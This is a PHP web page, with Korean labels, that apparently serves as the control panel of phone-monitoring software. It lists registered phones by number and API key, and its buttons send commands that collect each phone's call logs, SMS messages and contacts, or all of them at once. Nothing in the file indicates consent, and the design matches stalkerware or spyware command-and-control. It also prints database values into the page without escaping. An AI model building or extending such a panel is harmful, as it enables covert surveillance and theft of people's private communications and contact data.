<?php
include_once "dbcon.php";
include_once "common.php";
?>

<!DOCTYPE html>
<html lang="en" >
<head>
    <meta charset="UTF-8">
    <title>제어</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/button.css">
    <script language="javascript" type="text/javascript">
        function openWin(url){
            window.open(url, "메세지", "width=800, height=700, toolbar=no, menubar=no, scrollbars=no, resizable=yes" );
        }
    </script>
</head>
<!-- partial:index.partial.html -->
<body>
<div id="wrapper">
    <h1>제어</h1>

    <table id="keywords" cellspacing="0" cellpadding="0">
        <thead>
        <tr>
            <th><span>폰번호</span></th>
            <th><span>API키</span></th>
            <th><span>설정날짜</span></th>
            <th><span>수집</span></th>
            <th><span>수집</span></th>
            <th><span>수집</span></th>
            <th><span>수집</span></th>
        </tr>
        </thead>
        <tbody>

        <?php
        $sql = "SELECT * FROM `key_table` order by phonenumber";
        select_run($sql, $total_record , $result, $connect);
        for($i=0; $i < $total_record; $i++) {
            mysqli_data_seek($result, $i);
            $row = mysqli_fetch_array($result);

            echo "<tr>";
            echo "<td>".$row['phonenumber']."</td>";
            echo "<td><p style='text-overflow: ellipsis;width: 100px;overflow: hidden;'>".$row['apikey']."</p></td>";
            echo "<td>".$row['regdate']."</td>";
            echo "<td><button onclick=\"openWin('sendcmd_msg_tar.php?cmd=calllogreceive&apikey=$row[apikey]');\" class=\"learn-more\" style=\"width: 100px;\">전화</button></td>";
            echo "<td><button onclick=\"openWin('sendcmd_msg_tar.php?cmd=smslogreceive&apikey=$row[apikey]');\" class=\"learn-more\" style=\"width: 100px;\">문자</button></td>";
            echo "<td><button onclick=\"openWin('sendcmd_msg_tar.php?cmd=booklogreceive&apikey=$row[apikey]');\" class=\"learn-more\" style=\"width: 100px;\">연락</button></td>";
            echo "<td><button onclick=\"openWin('sendcmd_msg_tar.php?cmd=receiveall&apikey=$row[apikey]');\" class=\"learn-more\" style=\"width: 100px;\">전체</button></td>";
            echo "</tr>";
        }

        ?>
        </tbody>
    </table>
    <button onclick="openWin('sendcmd_msg.php?cmd=calllogreceive');" class="learn-more" style="width: 100px;">전화</button>
    <button onclick="openWin('sendcmd_msg.php?cmd=smslogreceive');" class="learn-more" style="width: 100px;">문자</button>
    <button onclick="openWin('sendcmd_msg.php?cmd=booklogreceive');" class="learn-more" style="width: 100px;">연락처</button>
    <button onclick="openWin('sendcmd_msg.php?cmd=receiveall');" class="learn-more" style="width: 100px;">전체</button>

</div>
</body>
<!-- partial -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="js/script.js"></script>

</html>